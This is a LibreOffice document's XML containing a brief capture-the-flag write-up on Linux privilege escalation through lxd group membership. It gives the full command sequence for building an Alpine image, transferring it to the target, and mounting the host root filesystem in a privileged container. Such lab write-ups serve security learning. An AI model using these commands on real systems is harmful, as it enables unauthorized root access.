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F00000039C2AF637FF6E3B4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Quotations">
      <style:text-properties style:font-name="Ubuntu Mono" fo:background-color="#dddddd"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Quotations">
      <style:paragraph-properties fo:line-height="150%"/>
      <style:text-properties style:font-name="Ubuntu Mono" fo:background-color="#dddddd"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001a6ce0"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:background-color="#dddddd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style:font-name="Ubuntu Mono" fo:background-color="#dddddd" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Ubuntu Mono" officeooo:rsid="001a6ce0" fo:background-color="#dddddd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ivilege Escalation <text:span text:style-name="T1">for lxd group</text:span></text:h>
      <text:p text:style-name="Text_20_body">Once I got into the machine, I did the typical priv esc enumeration, but didn't find much until I ran ID, and saw we were in the lxd group</text:p>
      <text:p text:style-name="Text_20_body"><draw:a xlink:type="simple" xlink:href="https://camo.githubusercontent.com/6d632ba53cc1edfbaf3fe68ca1f11460a20478f13062bcb60f1f65df3226c171/68747470733a2f2f692e696d6775722e636f6d2f72386f4652796f2e706e67" office:target-frame-name="_blank" xlink:show="new"><draw:frame draw:style-name="fr1" draw:name="Image1" text:anchor-type="as-char" svg:width="16.536cm" svg:height="1.561cm" draw:z-index="0"><draw:image xlink:href="Pictures/100002010000026F00000039C2AF637FF6E3B4FA.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/><svg:title>LXD group</svg:title></draw:frame></draw:a></text:p>
      <text:p text:style-name="Text_20_body">Upon further research, I found lxd is a linux container manager, and can be used to mount the root folder on the host machine. I found this <text:a xlink:type="simple" xlink:href="https://www.hackingarticles.in/lxd-privilege-escalation/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">article</text:a>, which guides you through creating a container, and mounting to the root folder using lxd.</text:p>
      <text:p text:style-name="Text_20_body">From that article I found the following method for creating an alpine linux container and mounting it into the root directory.</text:p>
      <text:p text:style-name="Text_20_body">On your own machine run lxd-alpine-builder to make a small alpine linux container</text:p>
      <text:p text:style-name="Quotations"><text:span text:style-name="T5">$ </text:span><text:span text:style-name="T4">git clone </text:span><text:a xlink:type="simple" xlink:href="https://github.com/saghul/lxd-alpine-builder.git" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T4">https://github.com/saghul/lxd-alpine-builder.git</text:span></text:a></text:p>
      <text:p text:style-name="Text_20_body">CD into the clone directory and run the build-alpine file, which will generate a tar.gz file that contains the alpine linux container.</text:p>
      <text:p text:style-name="Text_20_body">The start a http server, and transfer the alpine linux container from your machine to the target machine</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span>python -m SimpleHTTPServer 5000 (your machine)</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span>wget yourip:5000/alpinecontainer.tar.gz</text:p>
      <text:p text:style-name="Text_20_body">Now that we have the alpine linux container on the target, we need to import it into lxc</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">$ </text:span>lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage</text:p>
      <text:p text:style-name="Text_20_body">Then we'll give the container privileges and add the root directory as a mount point, and start the container</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span>lxc init myimage ignite -c security.privileged=true</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">$ </text:span>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span>lxc start ignite</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span>lxc exec ignite /bin/sh</text:p>
      <text:p text:style-name="Text_20_body">From here if we cd into /mnt/root we can get the root flag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Bitstream Vera Sans" style:font-family-complex="'Bitstream Ver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01:08:22.941531497</meta:creation-date>
    <dc:date>2021-05-25T01:12:44.293010077</dc:date>
    <meta:editing-duration>PT4M23S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="1" meta:object-count="0" meta:page-count="1" meta:paragraph-count="19" meta:word-count="250" meta:character-count="1515" meta:non-whitespace-character-count="1284"/>
    <meta:generator>LibreOffice/7.0.4.2$Linux_X86_64 LibreOffice_project/00$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>